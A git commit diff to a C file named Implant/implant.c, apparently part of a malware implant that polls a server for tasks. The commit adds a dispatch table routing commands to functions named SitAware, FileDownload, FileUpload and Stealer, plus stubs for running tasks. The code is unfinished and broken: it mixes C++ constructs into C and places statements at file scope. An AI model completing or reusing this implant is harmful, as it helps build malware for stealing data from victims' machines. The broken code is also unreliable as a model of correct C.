0b34448cf9877343155330bc7bdd9b21a48a7138
xakojwm <wyattmorris24@gmail.com>
2022-11-30 03:31:52 -0800

    added dispatch table (nothing compiles yet)

--- Implant/implant.c
+++ Implant/implant.c
@@ -5,6 +5,8 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #include <stdlib.h>
 #include <string.h>
 #include "curl.h"
+#include <unordered_map> // want to include standard c++ stl 
+#include <iostream>
 
 #define SERVERNAME "placeholder"
 #define SLEEP 10
@@ -152,10 +154,32 @@ void SitAware();
 void Stealer();
 
 /*Task Dispatch*/
+using pfunc = void (*)(string);
+unordered_map<char *, pfunc> dispatch_table;
+dispatch_table["SitAware"] = &SitAware;
+dispatch_table["FileDown"] = &FileDownload;
+dispatch_table["FileUp"] = &FileUpload;
+dispatch_table["Stealer"] = &Stealer;
+
 //these functions are listd above but maybe we should break it up
 //tasks are lists of tasks structured [cmd: , args:, taskid: ]
-void task_dispatch(tasks);
+void tasks_dispatch(tasks);
+//create results arr and return
+
+void task_do(task);
+//get cmd, args, id
+//choose execute
+// read output from file and return res
+
+
 
 void tasking();
+
+/* other helper functions necessary*/
+
+void readFile(char * Path, char * buf);
+
+
+
 
 
